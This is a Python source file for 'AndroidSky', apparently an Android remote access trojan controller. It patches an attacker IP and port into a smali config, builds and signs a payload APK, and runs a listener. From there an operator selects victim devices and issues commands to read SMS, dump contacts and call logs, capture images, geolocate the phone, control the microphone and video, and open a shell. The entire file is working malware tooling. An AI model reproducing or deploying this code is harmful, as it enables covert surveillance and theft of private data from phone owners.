#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import select
import platform
import argparse
import threading
import sys
import time
import itertools
import os
from colorama import Fore, Style,init
from queue import Queue
from module import *
from cryptography.fernet import Fernet

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

ip = " "
port = " "
output = "sky.apk"

def animation(message):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        print("\r"+message+c, end="")
        time.sleep(0.1)

done = False
t = threading.Thread(target=animation,args=("Starting AndroidSky...",))
t.start()
time.sleep(7)
done = True

t.join()
os.system("clear")

class color :
	reset 	= Style.BRIGHT+Fore.RESET
	red 	= Style.BRIGHT+Fore.RED
	green	= Style.BRIGHT+Fore.GREEN
	blue	= Style.BRIGHT+Fore.BLUE
	white	= Style.BRIGHT+Fore.WHITE

# function to return title centered around string
center = lambda string, title: f"{{:^{len(string)}}}".format(title)


# making sokcet server
def make_socket():
	global server
	global ip
	global port
	try :
		server = socket.socket()
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # reuse socket

	except socket.error as msg:
		print ("socket error")

# bind server socket 
def bind_socket():
	global server
	global ip
	global port
	try :

		server.bind((ip, int(port)))
		server.listen(10)
		
		print ("\nserver started"+"\n"+"waiting connection ...")
	
	except socket.error as msg:
		print("address already in use !\n")
		listener()
		
		

# handle connection & close previous connection
def accept_socket():
	for c in all_connections :
		c.close()
	del all_connections[:]
	del all_address[:]
	while True :
		try :
			conn, address = server.accept()
			conn.setblocking(1)   #prevent time out connection
			all_connections.append(conn)
			all_address.append(address)
			print (" ")
			print ("\n"+"client connected "+address[0])
		except :
			print ("error while accepting client")

	
# refresh conn and append connection to list

def refresh_connection() :
	global all_connections, all_address, conn
	for intCounter, conn in enumerate(all_connections) :
		try :
			conn.send(str.encode('')) #ping client
		except socket.error :
			del all_address[all_connections.index(conn)]
			all_connections.remove(conn) 
			conn.close()

def list_connection() :
    refresh_connection()
    results = ''
    for i, conn in enumerate(all_connections):

        results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("Connected client :" + "\n" +results)

#pick target 
#interact with client
def pick_target(cmd):
    try:
        target = cmd.replace('pick ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn

    except:
        print("Invalid ID !\n")
        return None

#send command to client
def message_to_send(conn) :
	global msg
	while True :
		try :
			msg = conn.recv(20480).decode("UTF-8")
			if ("readSMS" in msg.strip()) :
				content = msg.strip().split(" ")
				data = content[1]
				readSMS(conn,data)
			elif(msg.strip() == "SHELL"):
				shell(conn)
			elif(msg.strip() == "callLogs") :
				callLogs(conn)
			elif(msg.strip() == "help") :
				help()
			elif(msg.strip() == "dump_contacts") :
				dump_contacts(conn)
			elif(msg.strip() == "IMAGE"):
				getImage(conn)
			elif(msg.strip() == "app_list") :
				app_list(conn)
			elif(msg.strip() == "stop_mic") :
				stop_mic(conn)
			elif(msg.strip() == "stopVideo123") :
				stopVideo(conn)
			elif(msg.strip() == "geolocate"):
				geolocate(conn)
			else:
				print(msg, end="")
			mts = input("meterpreter > ")
			mts = mts+"\n"
			conn.send(mts.encode("UTF-8"))
			if mts.strip() == "exit":
				print(" ")
				print("good bye..")
				exit()
			if (mts.strip() == "clear"):clear()
			if (mts.strip() == "back"):
				print ("back to listener")
				listener()
		except socket.error as mts :
			print (" ")
			print ("connections die, back to server now...\n")
			time.sleep(2)
			listener()


def banner_1() :
	print (color.blue+"""
  .d8b.  d8b   db d8888b. d8888b.  .d88b.  .d8888. db   dD db    db 
 d8' `8b 888o  88 88  `8D 88  `8D .8P  Y8. 88'  YP 88 ,8P' `8b  d8' 
 88ooo88 88V8o 88 88   88 88oobY' 88    88 `8bo.   88,8P    `8bd8'  
 88~~~88 88 V8o88 88   88 88`8b   88    88   `Y8b. 88`8b      88    
 88   88 88  V888 88  .8D 88 `88. `8b  d8' db   8D 88 `88.    88    
 YP   YP VP   V8P Y8888D' 88   YD  `Y88P'  `8888Y' YP   YD    YP                                                
"""+color.reset)

def run():
	try :
		while True :
			sky = input("andro("+color.red+"sky"+color.reset+")> ")
			if sky == "help" or sky == "?" :
				help_02()
			elif sky == "clear" :
				os.system("clear")
			elif sky == "banner" :
				banner_1()
			elif sky == "exit" :
				print ("thank you for using this tool")
				time.sleep(2)
				exit()
			elif sky == "payload" or sky == "Payload" :
				time.sleep(1)
				print(" ")
				payload()
			elif sky == "listener" or sky == "Listener" :
				time.sleep(1)
				print(" ")
				listener()
			else :
				os.system(sky)
	except KeyboardInterrupt :
		print(" ")
		print ("CTRL+C pressed, exiting...")
		time.sleep(1)
		print ("thank you for using this tool")
		print (" ")
		exit()
		

def help_02() :
	print (" ")
	print ("	Commands 		Description")
	print ("	--------		-----------")
	print ("	help / ?	        show this message")
	print ("	payload		        module for generate payload")
	print ("	listener	        module for open listener")
	print ("	banner		        show banner")
	print ("	clear		        clear screen")
	print ("	exit		        exit the tool")
	print (" ")

def sky() :
	banner_1()
	run()

def payload() :
	try :
		while True :
			global ip, port, output
			direc = "/"
			payload_sky = input(("andro("+color.red+"payload"+color.reset+")> "))
			if payload_sky == "help" or payload_sky == "Help" or payload_sky == "?"  :
				print (" ")
				print ("	Commands  			Description")
				print ("	--------			-----------")
				print ("	help / ?			show this message")
				print ("	set LHOST <IP>			configure IP for the payload")
				print ("	set LPORT <PORT>		configure PORT for the payload")
				print ("	set Output <output>		set the output name")
				print ("	show options 			show values of LHOST, LPORT & OUTPUT")
				print ("	run/generate 			build the payload")
				print ("	listener			jump to listener")
				print ("	clear				clear screen")
				print ("	back				back to previous")
				print ("	exit				exit ")
				print (" ")
			elif "set LHOST" in payload_sky or "set lhost" in payload_sky :
				ip = payload_sky.split()[-1]
				print ("["+color.blue+"*"+color.reset+"]LHOST = "+ip)
				print (" ")
			elif "set LPORT" in payload_sky or "set lport" in payload_sky :
				port = payload_sky.split()[-1]
				print ("["+color.blue+"*"+color.reset+"]LPORT = "+port)
				print (" ")
			elif "set Output" in payload_sky or "set output" in payload_sky :
				output = payload_sky.split()[-1]
				print ("["+color.blue+"*"+color.reset+"]Output = "+output)
				print (" ")
			elif payload_sky == "show options" :
				print (" ")
				print ("[+] LHOST   : %s\n[+] LPORT   : %s\n[+] OUTPUT  : %s\n" % (ip, port, output))
			elif payload_sky == "back" :
				run()
			elif payload_sky == "clear" :
				os.system("clear")
			elif payload_sky == "exit" :
				os.system("exit")
				print ("thank you for using this tool")
				time.sleep(2)
				exit()
			elif payload_sky == "listener" :
				time.sleep(1)
				print(" ")
				listener()
			elif payload_sky == "generate" or payload_sky == "run" :
				if ip == " ":
					print ("LHOST cannot be empty !")
					print (" ")
				elif port == " ":
					print ("LPORT cannot be empty !")
					print (" ")
				else :
					editor = "apk_files"+direc+"smali"+direc+"com"+direc+"android"+direc+"ld"+direc+"config.smali"
					try:
						file = open(editor,"r").readlines()
						file[16]=file[16][:21]+"\""+ip+"\""+"\n"
						file[21]=file[21][:21]+"\""+port+"\""+"\n"
						str_file="".join([str(elem) for elem in file])
						open(editor,"w").write(str_file)
					except Exception as e:
						print(e)
						sys.exit()
					java_ver = executeCMD("java -version")
					if java_ver.stderr == " ":
						print (" ")
						print (color.blue+"java is not installed !"+color.reset)
						print (color.blue+"Install java first !"+color.reset)
						print (" ")
					else :
						print (" ")
						print (color.blue+"Compiling the apk file..."+color.reset)
						resOut = executeCMD("java -jar jar/apktool.jar b apk_files  -o "+output)
						time.sleep(2)
						done = True
						if not resOut.returncode:
							print (color.blue+"Compiled Successfully"+color.reset+" "+output+"")
							print (color.blue+"Signing the apk..."+color.reset)
							resOut = executeCMD("java -jar jar/sign.jar "+output+" --override")
							time.sleep(2)
							if not resOut.returncode:
								print (color.blue+"apk signed successfully"+color.reset+" "+output+"")
								print (" ")
							else :
								print ("\r"+resOut.stderr)
								print(color.red+"Signing Failed"+color.reset)
						else :
							print("\r"+resOut.stderr)
							print("Building Failed")
			else :
				os.system(payload_sky)
	except KeyboardInterrupt :
		print(" ")
		print ("CTRL+C pressed, exiting...")
		time.sleep(1)
		print ("thank you for using this tool")
		print (" ")
		exit()

def listener() :
	while True:
		try:
			global ip
			global port
			cmd = input("andro("+color.red+"listener"+color.reset+")> ")
			if cmd == "help" or cmd == "?" :
				print (" ")
				print ("	Commands 		Description")
				print ("	--------		-----------")
				print ("	help/? 			show this message ")
				print ("	set LHOST 		configure IP for the listener ")
				print ("	set LPORT 		configure PORT for the listener ")
				print ("	show options 		show values of LHOST & LPORT ")
				print ("	run/start 		start the listener ")
				print ("	clear 			clear screen ")
				print ("	list			list all connected client")
				print ("	pick|ID			connect to selected client")
				print ("	back			back to previous")
				print ("	exit			exit ")
				print (" ")
			elif "set LHOST" in cmd or "set lhost" in cmd :
				ip = cmd.split()[-1]
				print ("["+color.blue+"*"+color.reset+"]LHOST = "+ip)
				print (" ")
			elif "set LPORT" in cmd or "set lport" in cmd :
				port = cmd.split()[-1]
				print ("["+color.blue+"*"+color.reset+"]LPORT = "+port)
				print (" ")
			elif cmd == "show options" :
				print (" ")
				print ("[+] LHOST   : %s\n[+] LPORT   : %s\n" % (ip, port))
			elif cmd == "clear" :
				os.system("clear")
			elif cmd == "back" :
				payload()
			elif cmd == "exit" :
				print ("thank you for using this tool")
				time.sleep(2)
				exit()
			elif "run" in cmd  or "start" in cmd :
				if ip == " ":
					print ("LHOST cannot be empty !")
					print (" ")
				elif port == " ":
					print ("LPORT cannot be empty !")
					print (" ")
				else :
					test()
			elif cmd == 'list':
				list_connection()
			elif "pick" in cmd:
				conn = pick_target(cmd)
				if conn is not None:
					message_to_send(conn)
			else :
				os.system(cmd)
		except KeyboardInterrupt :
			print ("CTRL+C pressed, exiting...")
			time.sleep(1)
			print ("thank you for using this tool")
			exit()

#making worker
def work_maker():
	for _ in range (NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

#handler connection 
def work():
	while True:
		x = queue.get()
		if x == 1 :
			make_socket()
			bind_socket()
			accept_socket()
		elif x == 2 :
			listener()

		queu.task_done()

def job_maker():
	for x in JOB_NUMBER :
		queue.put(x)
	
	queue.join() 

def test() :
	work_maker()
	job_maker()

sky()
